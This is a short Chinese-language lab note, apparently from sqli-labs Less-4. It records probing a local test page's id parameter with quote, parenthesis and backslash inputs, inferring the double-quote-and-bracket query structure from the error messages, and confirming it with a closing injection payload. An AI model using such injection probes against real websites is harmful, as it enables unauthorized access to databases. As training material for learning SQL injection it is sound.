@@ -1,0 +1,22 @@
+url:http://10.0.2.15/sqli/Less-4/?id=1
+显示：用户名和密码
+url:http://10.0.2.15/sqli/Less-4/?id=1%27
+显示：用户名和密码
+url:http://10.0.2.15/sqli/Less-4/?id=1)
+显示：用户名和密码
+
+于是推测可能是使用了双引号闭合了任何输入，此时任何输入都会被当作字符串处理
+
+url:http://10.0.2.15/sqli/Less-4/?id=1%22
+显示：报错'  "1"") LIMIT 0,1  '
+
+或者用‘\’（转移字符）
+显示：报错'  "1\") LIMIT 0,1  '
+
+即正常情况下（id=1）应为("1") limit 0,1
+故推测sql: select username,password from 用户表 where id = ("输入的id") limit 0,1;
+
+验证：
+url:http://10.0.2.15/sqli/Less-4/?id=1%22)%20--%20
+显示：用户名和密码
+故可证明推测成立
